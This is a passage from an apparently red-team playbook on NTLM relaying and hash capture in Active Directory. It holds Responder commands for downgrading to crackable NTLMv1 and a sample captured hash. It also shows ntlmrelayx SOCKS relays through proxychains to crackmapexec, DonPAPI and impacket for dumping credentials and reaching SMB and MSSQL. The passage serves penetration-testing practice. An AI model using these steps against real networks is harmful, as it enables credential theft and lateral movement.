								[SMB] NTLMv1-SSP Hash     : DC01$::SECURELAB:EDE0877AAA0B78747009A95EDE4DCAEC8BB556FFD18DAF3E:EDE0877AAA0B78747009A95EDE4DCAEC8BB556FFD18DAF3E:1122334455667788
								[+] Exiting...                                              
			* Disable ESS
				* <details><summary>Overview (Click to expand)</summary><p>
					* Remove SSP from authentication
					* NTLMv1-SSP --> NTLMv1
				* <details><summary>Responder (Click to expand)</summary><p>
					1. Modify Responder config to use the challenge `1122334455667788` for crack.sh compatibility.
					1. Run Responder

								python Responder.py -I <interface> --disable-ess
						* `--disable-ess`
					1. Capture coerced authentication
1. Coerce Authentication ([AD Forced Authenticaton Guide](Testaments_and_Books/Redvelations/Active_Directory/003-3_AD_Forced_Authentication.md), [`Forced Authentication` TTP](TTP/T1187_Forced_Authentication/T1187.md))
1. Optional: Socks Relay
	* <details><summary>ntlmrelayx Proxy (Click to expand)</summary><p>
		* Known Compatible Tools
			* crackmapexec
			* lsassy -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)
			* donpapi
			* impacket
		* To SMB
			* Reverse Shell (See other Reverse Shell notes in this guide)
			* <details><summary>Dump Credentials (Click to expand)</summary><p>
				* Requirements
					* Local Administrator
				* <details><summary>crackmapexec (Click to expand)</summary><p>
					* `crackmapexec` makes use of `secretsdump.py` but stores output to `cmedb`, which can be quite functional

						proxychains crackmapexec smb <target> -u <username> -p ''
				* <details><summary>donpapi (Click to expand)</summary><p>
					
						proxychains python DonPAPI.py <domain>/<username>@<target> -o <outfile.txt> -no-pass
					* "Is it possible to extract a non admin users master key via a relayed (non administrative) session? No it is not, as you need the user's password to derive a key (different existing algos) that will decrypt the master key. Could you theoretically relay to RPC on a DC to extract the users master key via MS-BKRP? You would still need an admin session to access the masterkey and dpapi blobs on the target. But with those on Hand, i think you should be able to decipher the masterkey via msbkrp. I haven’t really worked on that part, maybe @gentilkiwi. can spread some light here. You need to be able to impersonate the owner of masterkeys to be able to ask the backup rpc service to decrypt it ( sid is checked ). So, being a local admin is not enough)"
			* Enumerate Local Admins
				* <details><summary>Recommended: ntlmrelayx + Crackmapexec (Click to expand)</summary><p>
					* ntlmrelayx flag: `-socks`
					
						proxychains crackmapexec smb <target> -u <username> -p '' --users
		* To MSSQL
			* <details><summary>impacket's smbclient (Click to expand)</summary><p>
				* Examples
					* Example 1

							proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
			* <details><summary>impacket's mssqlclient (Click to expand)</summary><p>
				* Examples
					* Example 1

							proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
			* <details><summary>crackmapexec (Click to expand)</summary><p>
				* Examples
					* Example 1

							proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"
1. [Cracking Guide](Testaments_and_Books/Redvelations/Accounts/003_Cracking.md)

### From a Windows Machine

1. Enumerate
	* Systems with WebClientService Running
		* Recommended: Winpwn [https://github.com/S3cur3Th1sSh1t/WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn)
		* Alternative: [https://raw.githubusercontent.com/vletoux/SpoolerScanner/master/SpoolerScan.ps1](https://raw.githubusercontent.com/vletoux/SpoolerScanner/master/SpoolerScan.ps1)
1. Initiate auth. relaying/capturing tool ([Adversary-in-the-Middle TTP](TTP/T1557_Adversary-in-the-Middle/T1557.md))
	* NTLM
		* .NET
			*  <details><summary>Inveigh (Click to expand) -<br />[https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)</summary><p>

					.\Inveigh.exe
1. Coerce Authentication ([`Forced Authentication` TTP](TTP/T1187_Forced_Authentication/T1187.md))
1. [Cracking Guide](Testaments_and_Books/Redvelations/Accounts/003_Cracking.md)


## Unexplored, Needs Testing

* <details><summary>Unexplored Relay Notes (Click to expand)</summary><p>
	* <details><summary>lsarelayx (Click to expand)</summary><p>
		* [https://twitter.com/_EthicalChaos_/status/1449428722218676224](https://twitter.com/_EthicalChaos_/status/1449428722218676224)
			* "end to end POC working for lsarelayx.  System wide NTLM relay from Windows which relays all incoming NTLM authentications without affecting the original target application.  Silent relay if you will."
		* [https://www.youtube.com/watch?v=R5gJEGQ0yjM](https://www.youtube.com/watch?v=R5gJEGQ0yjM)
			* Attack
				1. Windows: `.\lsarelayx.exe`
				1. Victim: `http://<attackerip>`; enter user info: `<domain>\<username>:<password>`
		* [https://github.com/SecureAuthCorp/impacket/pull/1190]
* <details><summary>Uncategorized (Click to expand)</summary><p>
	* [https://twitter.com/424f424f/status/1418911232250290176](https://twitter.com/424f424f/status/1418911232250290176)
	* [https://pentestlab.blog/2021/10/18/resource-based-constrained-delegation/](https://pentestlab.blog/2021/10/18/resource-based-constrained-delegation/)
	* [https://pentestlab.blog/2021/10/20/lateral-movement-webclient/](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
	* [https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)
	* [https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/](https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/)